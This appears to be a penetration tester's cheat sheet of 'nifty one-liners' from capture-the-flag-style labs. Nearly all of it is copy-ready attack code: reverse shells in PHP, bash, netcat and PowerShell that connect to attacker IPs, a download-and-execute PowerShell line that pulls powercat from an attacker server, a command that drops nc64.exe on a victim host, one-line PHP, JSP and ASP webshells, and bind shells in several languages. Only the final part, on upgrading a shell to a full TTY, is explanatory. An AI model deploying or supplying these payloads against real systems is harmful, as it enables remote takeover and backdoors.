# Nifty One Liners

**PHP Reverse netcat**

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

**Reverse Bash**

```
bash -i >& /dev/tcp/10.x.x.x/443 0>&1
```

Where 443 is the port

**Reverse Powershell (interactive powershell)**

```
powershell -nop -c "$c = New-Object System.Net.Sockets.TCPClient('IP',4444);
$st = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $st.Read($b, 0, $b.Length)) -ne 0){;
$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
$sb = (IEX $d 2>&1 | Out-String );
$sb2 = $sb + 'PS ' + (pwd).Path + '> ';
$sby = ([text.encoding]::ASCII).GetBytes($sb2);
$st.Write($sby,0,$sby.Length);$st.Flush()};$c.Close()"
```

**Reverse cmd using Powershell (powercat)**

Download[ powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) and start python3 -m http.server in the same directory (Kali IP 192.168.1.109). Next start a NC listener on port 4444 and run this command on the victim:

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 4444 -e cmd"
```

**Download file at Victim using PowerShell**

Here, 10.10.16.3 is Kali IP (attacker) and -outf specifies the directory where to store file.

```powershell
powershell -c iwr http://10.10.16.3/nc64.exe -outf \Users\Administrator\Desktop\nc64.exe
```

## Webshells

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```



## **Bind shells**

**Bash bind shell**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Python bind shell**

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**Powershell bind shell**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```



## Reverse Shell

**Bash reverse shell**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

**Powershell reverse shell**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```



## Upgrading Shells

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```



## Backgrounding and upgrading our shell

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```shell-session
www-data@remotehost$ ^Z

harshitp0tter@htb[/htb]$ stty raw -echo
harshitp0tter@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```shell-session
$ echo $TERM

sample output: xterm-256color
```

```shell-session
$ stty size

sample output: 67 318
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell-session
$ export TERM=xterm-256color

$ stty rows 67 columns 318
```

Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.







